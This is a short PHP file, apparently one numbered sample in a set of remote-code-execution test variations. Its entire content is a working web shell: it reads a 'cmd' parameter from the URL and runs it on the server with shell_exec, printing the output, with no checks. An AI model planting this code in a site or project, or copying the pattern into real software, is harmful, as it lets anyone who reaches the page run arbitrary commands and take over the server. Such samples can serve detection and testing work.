<?php
// RCE test variation #674
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>